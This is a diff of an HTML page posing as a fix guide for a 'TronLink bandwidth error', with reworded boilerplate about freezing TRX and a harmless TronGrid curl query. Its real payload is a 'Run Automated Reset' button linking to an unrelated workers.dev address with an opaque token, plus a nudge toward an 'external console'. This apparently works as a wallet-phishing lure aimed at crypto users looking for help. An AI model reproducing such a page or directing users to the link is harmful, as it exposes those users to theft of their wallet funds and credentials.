@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tronlink Bandwidth Error</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #121214;
+        font-family: BlinkMacSystemFont;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #00adb5;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,36 +41,30 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter a "TronLink bandwidth error" when attempting to perform transactions or interact with smart contracts on the TRON network, resulting in failed or pending transactions.</li>
+<li>Users encounter a "TronLink bandwidth error" when attempting to perform transactions or interact with the TRON network using the TronLink wallet.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to insufficient bandwidth or energy on the user's TRON account, which is required to execute transactions on the network. This is a fundamental aspect of the TRON protocol, where bandwidth and energy are used to measure the resources consumed by transactions.</li>
+<li>The error occurs due to insufficient bandwidth or energy on the user's account, which is required to process transactions on the TRON network. This is a security measure to prevent spam transactions and ensure network stability.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the account's bandwidth by freezing TRX tokens for a specified period.</li>
-<li>Adjust the transaction parameters, such as the transaction timeout and confirmation threshold.</li>
-<li>Use the following JSON-RPC command to query the account's bandwidth:</li>
+<li>Increase account bandwidth by freezing TRX tokens for a specified period.</li>
+<li>Adjust transaction parameters to optimize energy consumption.</li>
+<li>Utilize the TronLink API to monitor and manage account resources:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;tron_getAccount&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
-<span class="w">    </span><span class="p">{</span>
-<span class="w">      </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;your_tron_address&quot;</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="w">  </span><span class="p">],</span>
-<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>https://api.trongrid.io/wallet/getaccount<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;address&quot;: &quot;your_tron_address&quot;}&#39;</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console to execute these commands for a more streamlined experience.</p>
+<p>Consider utilizing an external console for more complex diagnostics and overrides.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>A TRON account with a valid address</li>
-<li>A basic understanding of TRON's bandwidth and energy mechanisms</li>
-<li>The TRONLink extension or a compatible wallet installed</li>
+<li>A basic understanding of the TRON network and its resources (TRX, bandwidth, and energy)</li>
+<li>A TronLink wallet with a registered account</li>
+<li>Familiarity with command-line interfaces and JSON formatting</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
